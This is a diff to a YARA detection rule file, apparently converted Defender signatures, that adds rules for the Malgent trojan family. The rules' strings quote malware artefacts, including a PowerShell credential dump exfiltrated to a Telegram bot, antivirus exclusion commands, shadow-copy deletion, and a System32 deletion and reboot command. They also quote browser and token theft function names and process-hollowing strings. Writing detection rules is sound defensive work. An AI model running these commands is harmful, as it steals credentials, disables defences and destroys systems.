@@ -453,6 +453,56 @@ rule Trojan_Win32_Malgent_2147976556_3
         threshold = "12"
         strings_accuracy = "High"
     strings:
+        $x_3_1 = "\\config\\loginusers.vdf" ascii //weight: 3
+        $x_2_2 = "SteamPath" ascii //weight: 2
+        $x_2_3 = "ActiveUser" ascii //weight: 2
+        $x_1_4 = "machine.id" wide //weight: 1
+        $x_2_5 = "display_remoting" ascii //weight: 2
+        $x_2_6 = "no H264 encoder could be opened (tried nvenc, amf, h264_mf)" ascii //weight: 2
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_Win32_Malgent_2147976556_4
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win32/Malgent!atmn"
+        threat_id = "2147976556"
+        type = "Trojan"
+        platform = "Win32: Windows 32-bit platform"
+        family = "Malgent"
+        severity = "Critical"
+        info = "atmn: an internal category used to refer to some threats"
+        signature_type = "SIGNATURE_TYPE_PEHSTR"
+        threshold = "11"
+        strings_accuracy = "High"
+    strings:
+        $x_2_1 = "HttpCgiModule.dll" ascii //weight: 2
+        $x_3_2 = "Feature code found AND request from Google search, injecting JS" ascii //weight: 3
+        $x_3_3 = "Googlebot detected and feature code found, proxying request" ascii //weight: 3
+        $x_3_4 = "JS Injection WriteEntityChunks result: %d, bytes sent: %d" ascii //weight: 3
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_Win32_Malgent_2147976556_5
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win32/Malgent!atmn"
+        threat_id = "2147976556"
+        type = "Trojan"
+        platform = "Win32: Windows 32-bit platform"
+        family = "Malgent"
+        severity = "Critical"
+        info = "atmn: an internal category used to refer to some threats"
+        signature_type = "SIGNATURE_TYPE_PEHSTR"
+        threshold = "12"
+        strings_accuracy = "High"
+    strings:
         $x_3_1 = "Add-MpPreference -ExclusionProcess '" wide //weight: 3
         $x_3_2 = "create Sims4DLCService binPath= \"" wide //weight: 3
         $x_2_3 = "HolderBase64Chunks" ascii //weight: 2
@@ -463,7 +513,7 @@ rule Trojan_Win32_Malgent_2147976556_3
         (all of ($x*))
 }
 
-rule Trojan_Win32_Malgent_2147976556_4
+rule Trojan_Win32_Malgent_2147976556_6
 {
     meta:
         author = "defender2yara"
@@ -490,7 +540,7 @@ rule Trojan_Win32_Malgent_2147976556_4
         (all of ($x*))
 }
 
-rule Trojan_Win32_Malgent_2147976556_5
+rule Trojan_Win32_Malgent_2147976556_7
 {
     meta:
         author = "defender2yara"
@@ -517,7 +567,7 @@ rule Trojan_Win32_Malgent_2147976556_5
         (all of ($x*))
 }
 
-rule Trojan_Win32_Malgent_2147976556_6
+rule Trojan_Win32_Malgent_2147976556_8
 {
     meta:
         author = "defender2yara"
@@ -540,7 +590,33 @@ rule Trojan_Win32_Malgent_2147976556_6
         (all of ($x*))
 }
 
-rule Trojan_Win32_Malgent_2147976556_7
+rule Trojan_Win32_Malgent_2147976556_9
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win32/Malgent!atmn"
+        threat_id = "2147976556"
+        type = "Trojan"
+        platform = "Win32: Windows 32-bit platform"
+        family = "Malgent"
+        severity = "Critical"
+        info = "atmn: an internal category used to refer to some threats"
+        signature_type = "SIGNATURE_TYPE_PEHSTR"
+        threshold = "17"
+        strings_accuracy = "High"
+    strings:
+        $x_3_1 = "FENNEC_CONFIG_START" ascii //weight: 3
+        $x_3_2 = "Config loaded successfully - Host: %s, Port: %d, Group: %s" ascii //weight: 3
+        $x_3_3 = "Payload injected and running in memory as" ascii //weight: 3
+        $x_3_4 = "HandleProcessHollowing: resolved target=" ascii //weight: 3
+        $x_3_5 = "HandleProcessHollowingExec v16: executing" ascii //weight: 3
+        $x_2_6 = "kill_browsers" ascii //weight: 2
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_Win32_Malgent_2147976556_10
 {
     meta:
         author = "defender2yara"
@@ -568,7 +644,7 @@ rule Trojan_Win32_Malgent_2147976556_7
         (all of ($x*))
 }
 
-rule Trojan_Win32_Malgent_2147976556_8
+rule Trojan_Win32_Malgent_2147976556_11
 {
     meta:
         author = "defender2yara"
@@ -593,7 +669,53 @@ rule Trojan_Win32_Malgent_2147976556_8
         (all of ($x*))
 }
 
-rule Trojan_Win32_Malgent_2147976556_9
+rule Trojan_Win32_Malgent_2147976556_12
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win32/Malgent!atmn"
+        threat_id = "2147976556"
+        type = "Trojan"
+        platform = "Win32: Windows 32-bit platform"
+        family = "Malgent"
+        severity = "Critical"
+        info = "atmn: an internal category used to refer to some threats"
+        signature_type = "SIGNATURE_TYPE_PEHSTR"
+        threshold = "6"
+        strings_accuracy = "High"
+    strings:
+        $x_3_1 = "schtasks /create /tn \"System update\" /sc onlogon /rl highest /f /tr \"C:\\temp\\extract\\PsExec.exe -accepteula -d -i -s C:\\temp\\extract\\AutoHotkey64.exe C:\\temp\\extract\\new_link.ahk\"" ascii //weight: 3
+        $x_3_2 = "/c echo QWERTY1234566 | \"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe\" --set-password _unattended_access" ascii //weight: 3
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_Win32_Malgent_2147976556_13
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win32/Malgent!atmn"
+        threat_id = "2147976556"
+        type = "Trojan"
+        platform = "Win32: Windows 32-bit platform"
+        family = "Malgent"
+        severity = "Critical"
+        info = "atmn: an internal category used to refer to some threats"
+        signature_type = "SIGNATURE_TYPE_PEHSTR"
+        threshold = "10"
+        strings_accuracy = "High"
+    strings:
+        $x_2_1 = "$passwordLine = $profileInfo | Select-String \"Key Content\"" ascii //weight: 2
+        $x_3_2 = "Add-Content $out \"$ssidFormatted`t$password\" -Encoding UTF8" ascii //weight: 3
+        $x_2_3 = "cmdkey /list | Out-String | Add-Content $out -Encoding UTF8" ascii //weight: 2
+        $x_3_4 = "curl.exe -k https://api.telegram.org/bot$env:USERTOKEN/sendDocument -F chat_id=$env:USERID -F document=@$out" ascii //weight: 3
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_Win32_Malgent_2147976556_14
 {
     meta:
         author = "defender2yara"
@@ -621,7 +743,7 @@ rule Trojan_Win32_Malgent_2147976556_9
         (all of ($x*))
 }
 
-rule Trojan_Win32_Malgent_2147976556_10
+rule Trojan_Win32_Malgent_2147976556_15
 {
     meta:
         author = "defender2yara"
@@ -648,7 +770,7 @@ rule Trojan_Win32_Malgent_2147976556_10
         (all of ($x*))
 }
 
-rule Trojan_Win32_Malgent_2147976556_11
+rule Trojan_Win32_Malgent_2147976556_16
 {
     meta:
         author = "defender2yara"
@@ -676,7 +798,92 @@ rule Trojan_Win32_Malgent_2147976556_11
         (all of ($x*))
 }
 
-rule Trojan_Win32_Malgent_2147976556_12
+rule Trojan_Win32_Malgent_2147976556_17
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win32/Malgent!atmn"
+        threat_id = "2147976556"
+        type = "Trojan"
+        platform = "Win32: Windows 32-bit platform"
+        family = "Malgent"
+        severity = "Critical"
+        info = "atmn: an internal category used to refer to some threats"
+        signature_type = "SIGNATURE_TYPE_PEHSTR"
+        threshold = "31"
+        strings_accuracy = "High"
+    strings:
+        $x_3_1 = "StealBrowserCredentials" ascii //weight: 3
+        $x_3_2 = "DecryptChromiumPassword" ascii //weight: 3
+        $x_2_3 = "SELECT origin_url, username_value, password_value FROM logins" wide //weight: 2
+        $x_3_4 = "StealAppCredentials" ascii //weight: 3
+        $x_3_5 = "ExtractDiscordTokens" ascii //weight: 3
+        $x_3_6 = "ExtractSlackTokens" ascii //weight: 3
+        $x_2_7 = "StealTelegram" ascii //weight: 2
+        $x_2_8 = "StealSteam" ascii //weight: 2
+        $x_2_9 = "ZipAndSend" ascii //weight: 2
+        $x_3_10 = "SendFileToDiscord" ascii //weight: 3
+        $x_3_11 = "SendFileToControlChannel" ascii //weight: 3
+        $x_2_12 = "AES-256 exfil encrypted" wide //weight: 2
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_Win32_Malgent_2147976556_18
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win32/Malgent!atmn"
+        threat_id = "2147976556"
+        type = "Trojan"
+        platform = "Win32: Windows 32-bit platform"
+        family = "Malgent"
+        severity = "Critical"
+        info = "atmn: an internal category used to refer to some threats"
+        signature_type = "SIGNATURE_TYPE_PEHSTR"
+        threshold = "18"
+        strings_accuracy = "High"
+    strings:
+        $x_3_1 = "vssadmin delete shadows /all /quiet >nul 2>&1" ascii //weight: 3
+        $x_3_2 = "wbadmin delete catalog -quiet >nul 2>&1" ascii //weight: 3
+        $x_3_3 = "It seems that your files have been encrypted." ascii //weight: 3
+        $x_3_4 = "takeown /f C:\\Windows\\System32 /r /d y >nul 2>&1 & icacls C:\\Windows\\System32 /grant *S-1-5-32-544:F /t /c >nul 2>&1 & del /f /s /q C:\\Windows\\System32\\*.* >nul 2>&1 & rmdir /s /q C:\\Windows\\System32 >nul 2>&1 & shutdown /r /f /t 0" ascii //weight: 3
+        $x_2_5 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii //weight: 2
+        $x_2_6 = "DisableTaskMgr" ascii //weight: 2
+        $x_2_7 = "DisableRegistryTools" ascii //weight: 2
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_Win32_Malgent_2147976556_19
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win32/Malgent!atmn"
+        threat_id = "2147976556"
+        type = "Trojan"
+        platform = "Win32: Windows 32-bit platform"
+        family = "Malgent"
+        severity = "Critical"
+        info = "atmn: an internal category used to refer to some threats"
+        signature_type = "SIGNATURE_TYPE_PEHSTR"
+        threshold = "12"
+        strings_accuracy = "High"
+    strings:
+        $x_2_1 = "Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue | Out-Null" ascii //weight: 2
+        $x_2_2 = "if (Download-FileWithRetries -url $exeUrl -output $exePath) {" ascii //weight: 2
+        $x_2_3 = "Set-ItemProperty -Path $exePath -Name Attributes -Value \"Hidden\" -Force -ErrorAction SilentlyContinue | Out-Null" ascii //weight: 2
+        $x_2_4 = "$action = New-ScheduledTaskAction -Execute $exePath -ErrorAction SilentlyContinue" ascii //weight: 2
+        $x_2_5 = "$trigger = New-ScheduledTaskTrigger -AtLogOn -ErrorAction SilentlyContinue" ascii //weight: 2
+        $x_2_6 = "Register-ScheduledTask -TaskName \"WindowsUpdateService\" `" ascii //weight: 2
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule Trojan_Win32_Malgent_2147976556_20
 {
     meta:
         author = "defender2yara"
@@ -700,7 +907,7 @@ rule Trojan_Win32_Malgent_2147976556_12
         (all of ($x*))
 }
 
-rule Trojan_Win32_Malgent_2147976556_13
+rule Trojan_Win32_Malgent_2147976556_21
 {
     meta:
         author = "defender2yara"
@@ -730,7 +937,7 @@ rule Trojan_Win32_Malgent_2147976556_13
         (all of ($x*))
 }
 
-rule Trojan_Win32_Malgent_2147976556_14
+rule Trojan_Win32_Malgent_2147976556_22
 {
     meta:
         author = "defender2yara"
